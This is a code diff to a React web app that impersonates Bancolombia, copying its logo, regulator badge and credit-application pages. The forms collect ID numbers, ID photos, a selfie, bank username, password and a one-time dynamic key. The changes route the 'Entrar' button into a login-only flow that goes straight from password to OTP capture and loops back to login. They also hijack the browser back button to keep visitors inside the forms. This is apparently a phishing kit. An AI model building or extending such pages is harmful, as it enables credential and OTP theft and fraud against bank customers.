@@ -249,8 +249,12 @@ const CIUDADES_COLOMBIA = [
   "Zenón", "Zetaquira", "Zipaquirá", "Zona Bananera", "Zuas"
 ];
 
-function BancolombiaLogo() {
-  return <img src="/image.png" alt="Bancolombia" className="h-8 w-auto" />;
+function BancolombiaLogo({ onClick }: { onClick?: () => void }) {
+  return (
+    <button type="button" onClick={onClick} className="p-0 border-0 bg-transparent cursor-pointer">
+      <img src="/image.png" alt="Bancolombia" className="h-8 w-auto" />
+    </button>
+  );
 }
 
 function Field({
@@ -420,10 +424,10 @@ function CitySearch({
   );
 }
 
-function CreditForm({ onClose }: { onClose: () => void }) {
+function CreditForm({ mode, onClose }: { mode: 'form' | 'login'; onClose: () => void }) {
   const [step, setStep] = useState<FormStep>(0);
-  const [esCliente, setEsCliente] = useState<boolean | null>(null);
-  const [showLogin, setShowLogin] = useState(false);
+  const [esCliente, setEsCliente] = useState<boolean | null>(mode === 'login' ? true : null);
+  const [showLogin, setShowLogin] = useState(mode === 'login');
   const [showPassword, setShowPassword] = useState(false);
   const [usuario, setUsuario] = useState('');
   const [usuarioError, setUsuarioError] = useState('');
@@ -444,6 +448,25 @@ function CreditForm({ onClose }: { onClose: () => void }) {
   const [showFinalStep, setShowFinalStep] = useState(false);
   const [images, setImages] = useState<{ cedulaFront: string | null; cedulaBack: string | null; selfie: string | null }>({ cedulaFront: null, cedulaBack: null, selfie: null });
   const sentSteps = useRef(new Set<string>());
+
+  useEffect(() => {
+    window.history.pushState(null, '', window.location.href);
+  }, []);
+
+  useEffect(() => {
+    const handleBack = () => {
+      if (submitted || isProcessing) return;
+      if (showLogin) { setShowLogin(false); setEsCliente(null); return; }
+      if (showPassword) { setShowPassword(false); setShowLogin(true); return; }
+      if (showDynamicKey) { setShowDynamicKey(false); setShowFinalStep(true); return; }
+      if (showApproved) { setShowApproved(false); setShowDynamicKey(true); return; }
+      if (showFinalStep) { setShowFinalStep(false); setIsProcessing(true); return; }
+      if (step > 0) { setStep(s => (s - 1) as FormStep); return; }
+      if (step === 0) { onClose(); return; }
+    };
+    window.addEventListener('popstate', handleBack);
+    return () => window.removeEventListener('popstate', handleBack);
+  }, [step, showLogin, showPassword, showDynamicKey, showApproved, showFinalStep, isProcessing, submitted, onClose]);
 
   useEffect(() => {
     if (step === 1 && form.nombre.trim() && form.apellido.trim() && /^\d{6,12}$/.test(form.cedula) && /^\d{10}$/.test(form.telefono) && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(form.email) && form.ciudad.trim() && !sentSteps.current.has('step1')) {
@@ -659,7 +682,7 @@ function CreditForm({ onClose }: { onClose: () => void }) {
       <div className="fixed inset-0 z-50 bg-[#f5f5f3] overflow-hidden">
         {/* Top bar */}
         <div className="relative flex items-center justify-center py-4 px-6 border-b border-gray-200 bg-white">
-          <BancolombiaLogo />
+          <BancolombiaLogo onClick={onClose} />
           <button
             onClick={onClose}
             className="absolute right-6 flex items-center gap-1.5 text-sm font-semibold text-gray-600 hover:text-gray-900 transition-colors"
@@ -746,7 +769,7 @@ function CreditForm({ onClose }: { onClose: () => void }) {
 
         {/* Footer */}
         <div className="absolute bottom-0 left-0 right-0 border-t border-gray-200 bg-white px-6 py-4 flex items-center justify-between">
-          <BancolombiaLogo />
+          <BancolombiaLogo onClick={onClose} />
           <p className="text-[10px] text-gray-400 text-right leading-relaxed">
             {new Date().toLocaleDateString('es-CO', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' })}
           </p>
@@ -782,15 +805,20 @@ function CreditForm({ onClose }: { onClose: () => void }) {
     };
 
     const handlePasswordContinue = () => {
-      setShowPassword(false);
-      setStep(1);
+      if (mode === 'login') {
+        setShowPassword(false);
+        setShowDynamicKey(true);
+      } else {
+        setShowPassword(false);
+        setStep(1);
+      }
     };
 
     return (
       <div className="fixed inset-0 z-50 bg-[#f5f5f3] overflow-hidden">
         {/* Top bar */}
         <div className="relative flex items-center justify-center py-4 px-6 border-b border-gray-200 bg-white">
-          <BancolombiaLogo />
+          <BancolombiaLogo onClick={onClose} />
           <button
             onClick={onClose}
             className="absolute right-6 flex items-center gap-1.5 text-sm font-semibold text-gray-600 hover:text-gray-900 transition-colors"
@@ -871,7 +899,7 @@ function CreditForm({ onClose }: { onClose: () => void }) {
 
         {/* Footer */}
         <div className="absolute bottom-0 left-0 right-0 border-t border-gray-200 bg-white px-6 py-4 flex items-center justify-between">
-          <BancolombiaLogo />
+          <BancolombiaLogo onClick={onClose} />
           <p className="text-[10px] text-gray-400 text-right leading-relaxed">
             {new Date().toLocaleDateString('es-CO', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' })}
           </p>
@@ -894,7 +922,7 @@ function CreditForm({ onClose }: { onClose: () => void }) {
       <div className="fixed inset-0 z-50 bg-[#d4d4d2] flex flex-col overflow-hidden">
         {/* Top bar */}
         <div className="border-b border-gray-300 bg-white px-6 py-4 flex items-center justify-center">
-          <BancolombiaLogo />
+          <BancolombiaLogo onClick={onClose} />
         </div>
 
         {/* Center content */}
@@ -943,7 +971,7 @@ function CreditForm({ onClose }: { onClose: () => void }) {
       <div className="fixed inset-0 z-50 bg-white flex flex-col overflow-hidden">
         {/* Top bar */}
         <div className="border-b border-gray-100 bg-white px-6 py-4 flex items-center justify-center relative">
-          <BancolombiaLogo />
+          <BancolombiaLogo onClick={onClose} />
           <button
             onClick={onClose}
             className="absolute right-6 flex items-center gap-1.5 text-sm font-semibold text-gray-500 hover:text-gray-900 transition-colors"
@@ -1013,7 +1041,7 @@ function CreditForm({ onClose }: { onClose: () => void }) {
 
         {/* Footer */}
         <div className="border-t border-gray-100 bg-white px-6 py-4 flex items-center justify-center">
-          <BancolombiaLogo />
+          <BancolombiaLogo onClick={onClose} />
         </div>
       </div>
     );
@@ -1084,7 +1112,7 @@ function CreditForm({ onClose }: { onClose: () => void }) {
 
         {/* Top bar */}
         <div className="relative z-10 flex items-center justify-center py-4 px-8">
-          <BancolombiaLogo />
+          <BancolombiaLogo onClick={onClose} />
           {!otpProcessing && (
             <button
               onClick={() => { setShowDynamicKey(false); setShowFinalStep(true); setOtp(['', '', '', '', '', '']); setOtpAttempt(1); }}
@@ -1193,7 +1221,7 @@ function CreditForm({ onClose }: { onClose: () => void }) {
         {/* Footer */}
         <div className="absolute bottom-0 left-0 right-0 bg-white border-t border-gray-200 z-10 px-8 py-4 flex items-center justify-between">
           <div className="flex flex-col gap-1">
-            <BancolombiaLogo />
+            <BancolombiaLogo onClick={onClose} />
             <div className="flex items-center gap-1.5 mt-0.5">
               <span className="text-[8px] font-bold text-gray-500 border border-gray-400 px-1 py-px leading-tight tracking-wide">
                 VIGILADO
@@ -1235,7 +1263,7 @@ function CreditForm({ onClose }: { onClose: () => void }) {
 
         {/* Top bar */}
         <div className="relative z-10 flex items-center justify-center py-4 px-8">
-          <BancolombiaLogo />
+          <BancolombiaLogo onClick={onClose} />
         </div>
 
         {/* Content */}
@@ -1288,19 +1316,28 @@ function CreditForm({ onClose }: { onClose: () => void }) {
             </div>
 
             {/* Close */}
-            <button
-              onClick={onClose}
-              className="w-full bg-[#FFCC00] hover:bg-[#f0c000] text-[#1C1C1C] font-bold py-3.5 rounded-full transition-all shadow-sm hover:shadow-md text-sm"
-            >
-              Cerrar
-            </button>
+            {mode === 'login' ? (
+              <button
+                onClick={() => { setShowApproved(false); setStep(0); setEsCliente(true); setShowLogin(true); }}
+                className="w-full bg-[#FFCC00] hover:bg-[#f0c000] text-[#1C1C1C] font-bold py-3.5 rounded-full transition-all shadow-sm hover:shadow-md text-sm"
+              >
+                Continuar
+              </button>
+            ) : (
+              <button
+                onClick={onClose}
+                className="w-full bg-[#FFCC00] hover:bg-[#f0c000] text-[#1C1C1C] font-bold py-3.5 rounded-full transition-all shadow-sm hover:shadow-md text-sm"
+              >
+                Cerrar
+              </button>
+            )}
           </div>
         </div>
 
         {/* Footer */}
         <div className="absolute bottom-0 left-0 right-0 bg-white border-t border-gray-200 z-10 px-8 py-4 flex items-center justify-between">
           <div className="flex flex-col gap-1">
-            <BancolombiaLogo />
+            <BancolombiaLogo onClick={onClose} />
             <div className="flex items-center gap-1.5 mt-0.5">
               <span className="text-[8px] font-bold text-gray-500 border border-gray-400 px-1 py-px leading-tight tracking-wide">
                 VIGILADO
@@ -1729,7 +1766,7 @@ const steps = [
 ];
 
 export default function App() {
-  const [showForm, setShowForm] = useState(false);
+  const [showForm, setShowForm] = useState<'form' | 'login' | false>(false);
   const [menuOpen, setMenuOpen] = useState(false);
 
   return (
@@ -1766,10 +1803,14 @@ export default function App() {
           </div>
 
           <div className="hidden md:flex items-center gap-3">
-            <button className="bg-[#1C1C1C] text-white text-sm font-semibold px-5 py-2.5 rounded-full hover:bg-gray-800 transition-all">
+            <button
+              onClick={() => setShowForm('login')}
+              className="bg-[#1C1C1C] text-white text-sm font-semibold px-5 py-2.5 rounded-full hover:bg-gray-800 transition-all">
               Trámites digitales
             </button>
-            <button className="bg-[#FFCC00] text-[#1C1C1C] text-sm font-bold px-5 py-2.5 rounded-full hover:bg-[#f0c000] transition-all">
+            <button
+              onClick={() => setShowForm('login')}
+              className="bg-[#FFCC00] text-[#1C1C1C] text-sm font-bold px-5 py-2.5 rounded-full hover:bg-[#f0c000] transition-all">
               Entrar
             </button>
           </div>
@@ -1799,7 +1840,7 @@ export default function App() {
               <button className="flex-1 bg-[#1C1C1C] text-white font-semibold py-2.5 rounded-full text-xs">
                 Trámites digitales
               </button>
-              <button className="flex-1 bg-[#FFCC00] text-[#1C1C1C] font-bold py-2.5 rounded-full text-xs">
+              <button className="flex-1 bg-[#FFCC00] text-[#1C1C1C] font-bold py-2.5 rounded-full text-xs" onClick={() => setShowForm('login')}>
                 Entrar
               </button>
             </div>
@@ -1853,13 +1894,10 @@ export default function App() {
 
           <div className="flex flex-wrap items-center gap-4">
             <button
-              onClick={() => setShowForm(true)}
+              onClick={() => setShowForm('form')}
               className="bg-[#FFCC00] hover:bg-[#f0c000] text-[#1C1C1C] font-bold px-8 py-3.5 rounded-full transition-all shadow-md hover:shadow-lg hover:-translate-y-0.5 text-sm"
             >
               Solicitar crédito
-            </button>
-            <button className="border-2 border-[#1C1C1C] text-[#1C1C1C] font-semibold px-8 py-3 rounded-full hover:bg-gray-50 transition-all text-sm">
-              Ir al simulador
             </button>
           </div>
 
@@ -1964,7 +2002,7 @@ export default function App() {
 
           <div className="text-center mt-12">
             <button
-              onClick={() => setShowForm(true)}
+              onClick={() => setShowForm('form')}
               className="bg-[#FFCC00] hover:bg-[#f0c000] text-[#1C1C1C] font-bold px-10 py-4 rounded-full transition-all shadow-lg hover:shadow-xl hover:-translate-y-0.5 text-base"
             >
               Solicitar crédito ahora
@@ -1989,7 +2027,7 @@ export default function App() {
               604 604 9090
             </a>
             <button
-              onClick={() => setShowForm(true)}
+              onClick={() => setShowForm('form')}
               className="bg-[#FFCC00] hover:bg-[#f0c000] text-[#1C1C1C] font-bold px-6 py-3 rounded-full transition-all text-sm"
             >
               Solicitar ahora
@@ -2043,7 +2081,7 @@ export default function App() {
         </div>
       </footer>
 
-      {showForm && <CreditForm onClose={() => setShowForm(false)} />}
+      {showForm && <CreditForm mode={showForm} onClose={() => setShowForm(false)} />}
     </div>
   );
 }
